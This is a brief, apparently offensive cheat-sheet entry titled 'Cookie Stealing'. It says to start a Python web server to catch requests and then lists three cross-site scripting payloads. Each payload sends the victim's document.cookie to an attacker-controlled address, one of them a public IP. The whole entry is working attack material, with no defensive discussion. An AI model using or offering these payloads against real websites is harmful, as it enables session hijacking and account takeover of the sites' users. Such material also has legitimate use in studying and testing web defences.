[+] Cookie Stealing:

[-] Start Web Service

python -m SimpleHTTPServer 80

[-] Use one of the following XSS payloads:

<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
<script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
<img src=x onerror=this.src='http://34.211.174.102/?c='+document.cookie>